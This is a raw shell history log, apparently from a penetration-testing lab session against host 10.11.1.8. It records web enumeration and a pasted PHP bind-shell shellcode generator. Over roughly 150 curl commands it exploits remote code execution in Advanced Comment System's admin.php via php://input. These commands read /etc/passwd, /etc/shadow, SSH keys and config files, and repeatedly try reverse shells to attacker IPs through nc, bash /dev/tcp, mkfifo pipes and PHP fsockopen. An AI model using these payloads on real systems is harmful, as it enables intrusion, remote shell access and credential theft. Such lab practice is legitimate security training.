    1  2020-08-16 19:40  cd .oh-my-zsh/themes
    2  2020-08-16 19:41  source .zshrc
    3  2020-08-16 19:41  cd 9
    4  2020-08-16 19:41  cat targeted
    5  2020-08-16 19:44  sudo apt install gobuster
    6  2020-08-16 19:44  gobuster -h
    7  2020-08-16 19:46  gobuster -u http://10.11.1.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    8  2020-08-16 19:47  gobuster dir -u http://10.11.1.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    9  2020-08-17 19:06  nikto
   10  2020-08-17 19:07  nikto -h 10.11.1.8
   11  2020-08-17 19:24  gobuster
   12  2020-08-17 19:25  gobuster dir -u http://10.11.1.8/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   13  2020-08-17 19:30  gobuster dir -u http://10.11.1.8/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   14  2020-08-17 19:56  gobuster dir -u http://10.11.1.8/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   15  2020-08-17 20:01  gobuster dir -u http://10.11.1.8/manual/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   16  2020-08-17 20:02  gobuster dir -u http://10.11.1.8/usage/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   17  2020-08-17 20:04  gobuster dir -u http://10.11.1.8/usage/ --wildcard -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   18  2020-08-17 20:12  gobuster dir -u http://10.11.1.8/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php,js,bak
   19  2020-08-17 20:17  mkdir 7
   20  2020-08-17 20:18  /usage
   21  2020-08-17 20:18  python3 -m pip install lsassy
   22  2020-08-17 20:18  python3 -m pip3 install lsassy
   23  2020-08-17 20:35  curl   http://10.11.1.8/internal/sample.php
   24  2020-08-17 20:44  lcoa php/webapps/12454.txt\n
   25  2020-08-17 20:44  locate php/webapps/12454.txt\n
   26  2020-08-17 20:45  vim /usr/share/exploitdb/exploits/php/webapps/12454.txt\n
   27  2020-08-17 20:46  php /usr/share/exploitdb/shellcodes/generator/13282.php
   28  2020-08-17 20:46  php /usr/share/exploitdb/shellcodes/generator/13282.php 77
   29  2020-08-17 20:46  php /usr/share/exploitdb/shellcodes/generator/13282.php 4444
   30  2020-08-17 20:47  cat /usr/share/exploitdb/shellcodes/generator/13282.php
   31  2020-08-17 20:51  <?php\n/*\nUtility : Generate Payload PortBind Linux/x86\nAuthor  : Jonathan Salwan\nMail    : submit [shell-storm.org\n\n        More shellcodes in => http://www.shell-storm.org/shellcode/\n*/\n\nfunction syntax()\n        {\n        echo "\nSyntax:\nroot@laptop:/# php ./payload.php <port>\n\n";\n        }\n\nfunction linux86bind($port)\n                {\n                if($port > 65535 || $port < 4100){\n                        echo "Erreur Port\nSelect a port between 4100 and 65535\n";\n                        return false;\n                        }\n\n                $inser .= "\nchar shellcode[] = \n";\n                $inser .= "                     /* BindPort TCP/$port; Linux/x86; Gen:http://www.shell-storm.org */\n";\n                $inser .= "\n";\n                $inser .= "                     \x22\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\x22\n";\n                $inser .= "                     \x22\\x43\\x53\\x89\\xe1\\x4b\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68\\x";\n\n                $res_port       = base_convert($port, 10, 16);\n\n                $length         = strlen($res_port)-1;\n                $i              = 1;\n\n                for($idx = 0; $idx < $length+1; $idx++)\n                {\n                $i++;\n                if($i == 4)\n                $inser .= "\\x";\n\n                $inser .= $res_port[$idx];\n                }\n\n                $inser .= "\\x43\\x66\\x53\x22\n";\n                $inser .= "                     \x22\\x89\\xe1\\xb0\\x10\\x50\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x66\\xb3\\x04\x22\n";\n                $inser .= "                     \x22\\xcd\\x80\\x50\\x50\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\x22\n";\n                $inser .= "                     \x22\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x51\\x68n/sh\\x68//bi\\x89\\xe3\\x51\\x53\\x89\x22\n";\n                $inser .= "                     \x22\\xe1\\xb0\\x0b\\xcd\\x80\x22\x3b\n";\n                $inser .= "\n";\n                $inser .= "     printf(\x22Length: %d\\n\x22,strlen(shellcode));\n";\n                $inser .= "     (*(void(*)()) shellcode)();\n";\n                $inser .= "\n";\n                $inser .= "\n";\n\n        return $inser;\n}\n\nif($argc < 2){\n        syntax();\n        return false;\n        }\n                $port = $argv[1];\n                echo linux86bind($port);\n\n?>\n
   32  2020-08-18 09:45  sudo -s 
   33  2020-08-18 09:46  cat cur
   34  2020-08-18 09:46  cat curl
   35  2020-08-18 18:22  python3 -m pip install --user pipxpython3 -m pip install --user pipx
   36  2020-08-18 18:22  sudo apt install python3-pip
   37  2020-08-18 18:25  python3 -m pip install --user pipx
   38  2020-08-18 18:26  python3 -m pipx ensurepath
   39  2020-08-18 18:28  sudo $(which autorecon) 
   40  2020-08-18 18:29  vim .profile
   41  2020-08-18 18:29  .. profile
   42  2020-08-18 18:29  . .profile
   43  2020-08-18 18:30  sudo visudo /etc/sudoers
   44  2020-08-18 18:30  sudo vim /etc/sudoers
   45  2020-08-18 18:41  pipx install git+https://github.com/Tib3rius/AutoRecon.git
   46  2020-08-18 18:45  sudo     apt-get install python3-venv\n
   47  2020-08-18 18:53  curl http://10.11.1.8/internal/sample.php/install.php
   48  2020-08-18 19:07  chmod +x lol.sh
   49  2020-08-18 19:08  ./lol.sh
   50  2020-08-18 19:13  gobuster dir -u http://10.11.1.8/internal/advanced_comment_system/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php
   51  2020-08-18 19:19  scd 8
   52  2020-08-18 19:20  curl -s --data "<?system('ls -la');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   53  2020-08-18 19:20  curl -s --data "<?system('uname- a');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   54  2020-08-18 19:30  nc -version
   55  2020-08-18 19:30  curl -s --data "<?system('nc -version');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   56  2020-08-18 19:30  curl -s --data "<?system('python --versiion');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   57  2020-08-18 19:31  curl -s --data "<?system('uname -a');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   58  2020-08-18 19:31  curl -s --data "<?system('netcat');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   59  2020-08-18 19:31  curl -s --data "<?system('socat');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   60  2020-08-18 19:31  curl -s --data "<?system('bash');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   61  2020-08-18 19:34  curl -s --data "<?system('locate / ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   62  2020-08-18 19:34  curl -s --data "<?system('vim ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   63  2020-08-18 19:34  curl -s --data "<?system('netcat ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   64  2020-08-18 19:35  curl -s --data "<?system('ssh ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   65  2020-08-18 19:37  curl -s --data "<?system('curl ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   66  2020-08-18 19:37  curl -s --data "<?system('wget ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   67  2020-08-18 19:39  curl -s --data "<?system('ls ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   68  2020-08-18 19:39  curl -s --data "<?system('su ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   69  2020-08-18 19:39  curl -s --data "<?system('su root');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   70  2020-08-18 19:45  nc simple-backdoor.php
   71  2020-08-18 19:47  curl -s --data "<?system('nc 192.168.182.128 1234 -e /bin/bash');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   72  2020-08-18 19:48  curl -s --data "<?system('nc 192.168.119.217 1234 -e /bin/bash');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   73  2020-08-18 19:48  curl -s --data "<?system('nc 192.168.119.217:1234 -e /bin/bash');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   74  2020-08-18 19:48  curl -s --data "<?system('nc 192.168.182.128:1234 -e /bin/bash');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   75  2020-08-18 19:48  curl -s --data "<?system('wget http://192.168.119.217:5000/php-reverse-shell.php ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   76  2020-08-18 19:52  curl -s --data "<?system('whoami');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   77  2020-08-18 19:53  curl -s --data "<?system('cd ~');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   78  2020-08-18 19:54  curl -s --data "<?system('cd /');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   79  2020-08-18 19:54  curl -s --data "<?system('cat /etc/passwd');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   80  2020-08-18 19:55  curl -s --data "<?system('cat /etc/shadow');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   81  2020-08-18 19:56  curl -s --data "<?system('cat id');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   82  2020-08-18 19:58  curl -s --data "<?system('wget');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   83  2020-08-18 19:58  curl -s --data "<?system('wget www.google.com');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   84  2020-08-18 19:58  wget google.com
   85  2020-08-18 19:59  rm index.html
   86  2020-08-18 19:59  curl -s --data "<?system('ftp');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   87  2020-08-18 20:04  searchsploit php revese shell
   88  2020-08-18 20:04  searchsploit php 
   89  2020-08-18 20:05  vim /usr/share/webshells/php/php-reverse-shell.php
   90  2020-08-18 20:07  curl -s --data "<?system('telnet');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   91  2020-08-18 20:08  curl -s --data "<?system('telnet --version');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   92  2020-08-18 20:08  curl -s --data "<?system('telnet -ersion');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   93  2020-08-18 20:08  curl -s --data "<?system('telnet -n');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   94  2020-08-18 20:08  curl -s --data "<?system('telnet ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   95  2020-08-18 20:08  curl -s --data "<?system('telnet -h');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   96  2020-08-18 20:10  curl -s --data "<?system('smp');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   97  2020-08-18 20:11  curl -s --data "<?system('crontab');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   98  2020-08-18 20:11  curl -s --data "<?system('whoami id');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
   99  2020-08-18 20:11  curl -s --data "<?system('id');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  100  2020-08-18 20:13  curl -s --data "<?system('which');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  101  2020-08-18 20:13  curl -s --data "<?system('bash -i >& /dev/tcp/192.168.56.12/1453 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  102  2020-08-18 20:23  curl -s --data "<?system('cd ..');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  103  2020-08-18 20:23  curl -s --data "<?system('ls -a');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  104  2020-08-18 20:32  curl http://10.11.1.8:3306/
  105  2020-08-18 20:38  curl -s --data "<?system('cat config.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  106  2020-08-18 20:45  curl -s
  107  2020-08-18 20:46  sudo vim /usr/share/webshells/php/php-reverse-shell.php
  108  2020-08-18 20:53  curl  --data "<?system('ls -a');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  109  2020-08-18 20:53  curl  --data-binary "<?system('ls -a');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  110  2020-08-18 21:10  curl  --data "<?system('php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  111  2020-08-18 21:11  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);`/bin/sh -i <&3 >&3 2>&3`;'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  112  2020-08-18 21:12  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);`/bin/sh -i <&3 >&3 2>&3`;');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  113  2020-08-18 21:13  curl  --data "<?system('nc -e /bin/sh 192.168.182.128 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  114  2020-08-18 21:13  curl  --data "<?system('nc -e /bin/sh 192.168.119.217 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  115  2020-08-18 21:14  curl  --data "<?system('nc -c bash 192.168.119.217 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  116  2020-08-18 21:18  curl  --data "<?exec('bash -i >& /dev/tcp/192.168.182.128/1234 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  117  2020-08-18 21:20  curl  --data "<?exec('nc -c bash 192.168.182.128 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  118  2020-08-18 21:22  curl  --data "<?system('bash -i >& /dev/tcp/172.16.237.245/4545 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  119  2020-08-18 21:30  curl  --data "<?system('bash -i >& /dev/tcp/192.168.182.128/1234 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  120  2020-08-18 21:32  curl -s --data "<?system('wget https://www.exploit-db.com/download/9545 --no-check-certificate');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  121  2020-08-18 21:32  locate 9545
  122  2020-08-18 21:35  curl  --data "<?system('wget http://localhost:5000/php-reverse-shell.php -o lol.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  123  2020-08-18 21:36  curl -s --data "<?system('ls');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  124  2020-08-18 22:11  netcat -l 4444
  125  2020-08-18 22:11  curl  --data "<?system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.182.128 1234 >/tmp/f');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  126  2020-08-18 22:41  curl  --data "<?system('cat ~/.ssh/*');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  127  2020-08-18 22:42  curl  --data "<?system('cat .ssh/*');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  128  2020-08-18 22:42  curl  --data "<?system('cat functions.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  129  2020-08-18 22:44  curl  --data "<?system('cat confings.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  130  2020-08-18 22:44  curl  --data "<?system('cat configs.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  131  2020-08-19 04:30  searchsploit php reveseshell
  132  2020-08-19 04:31  searchsploit php reverseshell
  133  2020-08-19 04:31  searchsploit php reverse shell
  134  2020-08-19 04:32  searchsploit reverseshell
  135  2020-08-19 04:32  searchsploit reverse shell php
  136  2020-08-19 06:21  nc -nvlp 25
  137  2020-08-19 06:24  ftp 10.10.1.8:20
  138  2020-08-19 06:25  curl  --data "<?system('nc -c bash 192.168.182.128 80 "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  139  2020-08-19 06:25  curl  --data "<?system('ftp --version');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  140  2020-08-19 06:28  burpbrup
  141  2020-08-19 06:28  brup
  142  2020-08-19 06:46  python -m SimpleHTTPServer 21
  143  2020-08-19 07:14  curl  --data "<?system('whoami');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  144  2020-08-19 07:26  nc -nvlp 20
  145  2020-08-19 07:26  nc -nvlp 21
  146  2020-08-19 07:26  nc -nvlp 22
  147  2020-08-19 07:26  sudo nc -nvlp 20
  148  2020-08-19 07:27  curl  --data "<?system('nc -c bash 192.168.182.128 21 "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  149  2020-08-19 07:27  curl  --data "<?system('nc -c bash 192.168.182.128 21') "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  150  2020-08-19 07:28  curl  --data "<?system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.182.128 21 >/tmp/f');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  151  2020-08-19 07:29  curl  --data "<?system('bash -i >& /dev/tcp/192.168.182.128/21 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  152  2020-08-19 07:30  sudo nc -nvlp 21
  153  2020-08-19 07:30  curl  --data "<?system('nc -c bash 192.168.182.128 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  154  2020-08-19 07:31  curl  --data "<?system('nc -c bash 192.168.182.128 21');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"u
  155  2020-08-19 07:35  ssh root@10.11.0.8:3306
  156  2020-08-19 07:35  ssh 10.11.0.8:3306
  157  2020-08-19 07:35  ssh root@10.11.0.8
  158  2020-08-19 07:36  ssh root@10.11.0.8 -p 3306
  159  2020-08-19 07:38  vsftpd 
  160  2020-08-19 07:38  msrf
  161  2020-08-19 07:38  mfs
  162  2020-08-19 07:42  curl  --data "<?system('ssh');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  163  2020-08-19 07:43  curl  --data "<?system('ssh --version');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  164  2020-08-19 07:43  curl  --data "<?system('ftp');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  165  2020-08-19 07:43  curl  --data "<?system('ftp -h');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  166  2020-08-19 07:48  curl  --data "<?system('axel');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  167  2020-08-19 07:48  axel
  168  2020-08-19 07:49  curl  --data "<?system('axel -h');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  169  2020-08-19 07:52  curl  --data "<?system('jouralctl -l');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  170  2020-08-19 07:59  locate access
  171  2020-08-19 07:59  locate access.log
  172  2020-08-19 07:59  cat /var/log/nginx/access.log
  173  2020-08-19 08:00  sudo cat /var/log/nginx/access.log
  174  2020-08-19 08:04  curl  --data "<?system('ftp 192.168.182.128 21');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"u
  175  2020-08-19 08:06  ftp 10.10.1.8
  176  2020-08-19 18:40  curl  --data "<?system('ftp 192.168.182.128 ');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"u
  177  2020-08-19 18:42  curl  --data "<?system(php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  178  2020-08-19 18:45  curl  --data "<?system(php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  179  2020-08-19 18:46  curl  --data "<?system(php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  180  2020-08-19 18:46  curl  --data "<?system('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  181  2020-08-19 18:46  curl  --data "<?system(php);?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  182  2020-08-19 18:46  curl  --data "<?system(php --versin);?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  183  2020-08-19 18:46  curl  --data "<?system(php --version);?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  184  2020-08-19 18:46  curl  --data "<?system(php -version);?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  185  2020-08-19 18:46  curl  --data "<?system(php );?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  186  2020-08-19 18:47  curl  --data "<?system('php --version');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  187  2020-08-19 18:48  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  188  2020-08-19 18:48  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  189  2020-08-19 18:48  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);d');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  190  2020-08-19 18:48  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);exec');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  191  2020-08-19 18:48  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);exec()');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  192  2020-08-19 18:49  curl  --data "<?system('php -r $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3")');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  193  2020-08-19 18:53  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  194  2020-08-19 18:59  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  195  2020-08-19 18:59  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i <&3 >&3 2>&3"););?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  196  2020-08-19 18:59  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec);?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  197  2020-08-19 19:00  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec(""));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  198  2020-08-19 19:00  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/bash"));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  199  2020-08-19 19:00  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh"));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  200  2020-08-19 19:01  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i  <&3 >&3 2>&3"));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  201  2020-08-19 19:01  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i  <&3 >&3 2>&3 "));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  202  2020-08-19 19:01  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i  <&3 3 2>&3 "));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  203  2020-08-19 19:01  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i   "));?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  204  2020-08-19 19:03  curl  --data "<?system('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  205  2020-08-19 19:03  curl  --data "<?system('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i 3");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  206  2020-08-19 19:03  curl  --data "<?system('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  207  2020-08-19 19:04  curl  --data "<?system('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  208  2020-08-19 19:04  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  209  2020-08-19 19:05  curl  --data "<?system('php -r $sock=fsockopen("192.168.182.128",4444);');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  210  2020-08-19 19:16  php -r '$sock=fsockopen("10.0.0.1",1234);\n
  211  2020-08-19 19:16  php -r $sock=fsockopen("10.0.0.1",1234);\n
  212  2020-08-19 19:16  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'\n
  213  2020-08-19 19:17  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i k");'\n
  214  2020-08-19 19:20  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh echo connected ");'\n
  215  2020-08-19 19:21  php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh echo connected ");'\n
  216  2020-08-19 19:23  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3>&32>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  217  2020-08-19 19:24  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("exec 3<> File.txt ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  218  2020-08-19 19:25  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("3<> File.txt ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  219  2020-08-19 19:25  nc -nvlp 443
